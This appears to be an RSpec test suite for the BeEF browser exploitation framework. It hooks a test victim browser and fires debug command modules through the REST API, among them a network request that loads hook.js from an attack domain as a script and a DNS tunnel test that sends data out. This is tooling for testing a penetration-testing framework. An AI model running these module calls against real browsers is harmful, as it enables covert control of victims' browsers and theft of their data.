#
# Copyright (c) 2006-2020 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#

require 'rest-client'
require 'json'
require_relative '../../../support/constants'
require_relative '../../../support/beef_test'

RSpec.describe 'BeEF Debug Command Modules:' do

    before(:all) do
        # Grab config and set creds in variables for ease of access
        @config = BeEF::Core::Configuration.instance
        @username = @config.get('beef.credentials.user')
        @password = @config.get('beef.credentials.passwd')

        # Load BeEF exetensions and modules
        BeEF::Extensions.load

        sleep 10

        BeEF::Modules.load

        # Grab DB file and regenerate if requested
        db_file = @config.get('beef.database.file')

        if BeEF::Core::Console::CommandLine.parse[:resetdb]
            print_info 'Resetting the database for BeEF.'
            File.delete(db_file) if File.exists?(db_file)
        end

        # Load up DB and migrate if necessary
        ActiveRecord::Base.logger = nil
        OTR::ActiveRecord.migrations_paths = [File.join('core', 'main', 'ar-migrations')]
        OTR::ActiveRecord.configure_from_hash!(adapter:'sqlite3', database: db_file)

        context = ActiveRecord::Migration.new.migration_context
        if context.needs_migration?
          ActiveRecord::Migrator.new(:up, context.migrations, context.schema_migration).migrate
        end

        sleep 10

        BeEF::Core::Migration.instance.update_db!
        
        # Spawn HTTP Server
        http_hook_server = BeEF::Core::Server.instance
        http_hook_server.prepare

        # Generate a token for the server to respond with
        BeEF::Core::Crypto::api_token
       
        # Initiate server start-up
        @pids = fork do
            BeEF::API::Registrar.instance.fire(BeEF::API::Server, 'pre_http_start', http_hook_server)
        end
        @pid = fork do
          http_hook_server.start
        end
        
        # Give the server time to start-up
        sleep 1

        # Authenticate to REST API & pull the token from the response
        @response = RestClient.post "#{RESTAPI_ADMIN}/login", { 'username': "#{@username}", 'password': "#{@password}" }.to_json, :content_type => :json
        @token = JSON.parse(@response)['token']

        # Hook new victim
        @victim = BeefTest.new_victim

        sleep 5

        # Identify Session ID of victim generated above
        @hooks = RestClient.get "#{RESTAPI_HOOKS}?token=#{@token}"
        @session = JSON.parse(@hooks)['hooked-browsers']['online']['0']['session']
    end

    after(:all) do
        Process.kill("KILL",@pid)
        Process.kill("KILL",@pids)
    end

    it 'The Test_beef.debug() command module successfully executes', :run_on_browserstack => true do
        response = RestClient.post "#{RESTAPI_MODULES}/#{@session}/27?token=#{@token}", 
                                   { "msg": "test" }.to_json, 
                                   :content_type => :json
        result_data = JSON.parse(response.body)
        expect(result_data['success']).to eq "true"
    end

    it 'The Return ASCII Characters command module successfully executes', :run_on_browserstack => true do
        response = RestClient.post "#{RESTAPI_MODULES}/#{@session}/25?token=#{@token}",
                                { }.to_json,
                                :content_type => :json
        result_data = JSON.parse(response.body)
        expect(result_data['success']).to eq "true"    
    end

    it 'The Return Image command module successfully executes', :run_on_browserstack => true do
        response = RestClient.post "#{RESTAPI_MODULES}/#{@session}/22?token=#{@token}",
                                { }.to_json,
                                :content_type => :json
        result_data = JSON.parse(response.body)
        expect(result_data['success']).to eq "true"
    end


    it 'The Test HTTP Redirect command module successfully executes', :run_on_browserstack => true do
        response = RestClient.post "#{RESTAPI_MODULES}/#{@session}/24?token=#{@token}",
                                { }.to_json,
                                :content_type => :json
        result_data = JSON.parse(response.body)
        expect(result_data['success']).to eq "true"
    end

    it 'The Test Returning Results/Long String command module successfully executes', :run_on_browserstack => true do
        response = RestClient.post "#{RESTAPI_MODULES}/#{@session}/29?token=#{@token}",
                                { "repeat": 20,
                                "repeat_string": "beef" }.to_json,
                                :content_type => :json
        result_data = JSON.parse(response.body)
        expect(result_data['success']).to eq "true"
    end

    it 'The Test Network Request command module successfully executes', :run_on_browserstack => true do
        response = RestClient.post "#{RESTAPI_MODULES}/#{@session}/29?token=#{@token}",
                                { "scheme": "http",
                                    "method": "GET",
                                    "domain": "#{ATTACK_DOMAIN}",
                                    "port": "#{@config.get('beef.http.port')}",
                                    "path": "/hook.js",
                                    "anchor": "anchor",
                                    "data": "query=testquerydata",
                                    "timeout": "10",
                                    "dataType": "script" }.to_json,
                                    :content_type => :json
        result_data = JSON.parse(response.body)
        expect(result_data['success']).to eq "true"
    end

    it 'The Test DNS Tunnel command module successfully executes', :run_on_browserstack => true do
        response = RestClient.post "#{RESTAPI_MODULES}/#{@session}/26?token=#{@token}",
                                { "domain": "example.com",
                                    "data": "Lorem ipsum" }.to_json,
                                :content_type => :json
        result_data = JSON.parse(response.body)
        expect(result_data['success']).to eq "true"
    end

    it 'The Test CORS Request command module successfully executes', :run_on_browserstack => true do
        response = RestClient.post "#{RESTAPI_MODULES}/#{@session}/30?token=#{@token}",
                                { "method": "GET",
                                    "url": "example.com",
                                    "data": {
                                        "test": "data"
                                    }}.to_json,
                                    content_type: :json
        result_data = JSON.parse(response.body)
        expect(result_data['success']).to eq "true"
    end
end
